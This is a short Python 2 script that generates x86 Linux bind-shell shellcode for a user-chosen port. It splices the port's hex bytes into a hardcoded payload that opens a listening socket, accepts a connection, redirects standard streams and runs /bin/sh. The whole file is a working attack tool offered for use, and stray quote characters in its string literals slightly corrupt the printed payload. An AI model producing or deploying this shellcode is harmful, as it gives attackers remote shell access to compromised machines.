#!/usr/bin/env python
# -*- coding: utf-8 -*-
 
from argparse import ArgumentParser
parser = ArgumentParser(description="Shellcode generator")
parser.add_argument("-p","--port",dest="port", help="Provide a port between 1024 and 65535.", required=True,type=int )
args = vars(parser.parse_args())
arg_port = args["port"]
 
shellcode1 = \
""""\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68"""
 
 
shellcode2 = \
"""\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x53\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80";
"""
 
 
def portToHex(port):
        hexport  = str (hex(port)[2:] )
        if len (hexport) <= 3:
                temp = list(hexport)
                hex1 = temp[0]
                hex2 = temp[1]
                hex3 = temp[2]
                hexport = "\\x0"+hex1+"\\x"+hex2+hex3
        else:
                temp = list(hexport)
                hexport = "\\x"+temp[0]+temp[1]+"\\x"+temp[2]+temp[3]
        return hexport
if arg_port <= 65535 and arg_port >= 1024:
        port = portToHex(arg_port)
        print shellcode1 + port +shellcode2
else:
        print "Port too small. How unfortunate."